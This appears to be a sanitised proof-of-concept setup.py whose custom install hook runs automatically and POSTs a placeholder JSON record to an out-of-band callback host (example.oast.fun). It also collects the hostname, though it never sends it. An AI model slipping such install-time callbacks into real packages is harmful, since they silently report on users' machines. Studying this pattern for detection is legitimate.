import socket, json, urllib.request
from setuptools import setup
from setuptools.command.install import install
URL = 'https://example.oast.fun'
def report():
    host = socket.gethostname()
    data = {'host': 'example'}
    encoded = json.dumps(data).encode('utf-8')
    req = urllib.request.Request(URL, data=encoded)
    with urllib.request.urlopen(req) as response:
        response.read()
class Hook(install):
    def run(self):
        report()
setup(name='example', cmdclass={'install': Hook})
